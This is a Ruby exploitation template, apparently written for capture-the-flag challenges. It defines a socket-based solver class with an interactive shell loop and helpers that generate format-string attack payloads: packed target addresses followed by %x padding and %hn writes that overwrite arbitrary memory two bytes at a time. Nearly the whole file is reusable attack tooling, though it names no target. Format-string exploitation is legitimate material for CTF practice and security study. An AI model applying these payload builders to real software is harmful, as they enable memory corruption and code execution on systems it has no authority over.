# encoding: ASCII-8BIT
require 'pry'
require 'pp'
require 'socket'
require 'pwnlib'
require 'fsalib'

class String
  def to_ihex
    to_i 16
  end

  def to_bin
    unpack('H*').first.to_ihex
  end
end

class Integer
  def to_shex
    to_s 16
  end
end

class Solver < PwnTube
  def set_nodelay
    socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
  end

  def gets(num=nil, timeout=2)
    if num
      num.times.map{ recv_until("\n", timeout)}
    else
      recv_until("\n", timeout)
    end
  end

  def recvnb(byte=0xffff)
    socket.read_nonblock(byte) rescue nil
  end

  def io(str)
    puts str
    gets + recvnb
  end

  def interact(terminate_string = "exit")
    $>.puts recvnb(1024*5)
    $>.puts('Interactive')
    socket.flush
    loop do
      $>.print '>> '
      s = $stdin.gets
      break if !s || s.chomp == terminate_string
      socket.puts(s)
      sleep(0.1)
      $>.puts recvnb(1024*5)
    end
  end

  alias :puts :sendline
  alias :read :recv
  alias :readnb :recvnb
  alias :i :interact
end

def pack(hex_str)
  [hex_str].pack('V')
end

def unpack(hex_str)
  hex_str.unpack('V')[0]
end

def fsa_1word(pos, dest_addr, value)
  # 下位から書き込むためにsplit&reverse
  data    = value.to_shex.reverse.scan(/.{1,4}/).map{|s| s.reverse.to_ihex}
  stage   = data.size # 分割数
  dests   = stage.times.map{|i| pack(dest_addr+0x2*i)}
  num     = dests.map(&:size).inject(&:+)
  nums    = data.unshift(num).each_cons(2).map{|val,num| (num-val)%0x10000}
  payload = nums.map.with_index{|v,i| "%#{v}x%#{pos+i}$hn"}.inject(&:+)
  dests.inject(&:+) + payload
end

def fsa_2bytes(pos, dest_addr, str)
  nums = str.scan(/.{1,2}/).map{|s| s.reverse.to_bin}
  nums.map.with_index do |n,i|
    padding = (n-pack(dest_addr).size-1) % 0x10000
    "A#{pack(dest_addr+2*i)}%#{padding}x%#{pos}$hn"
  end
end
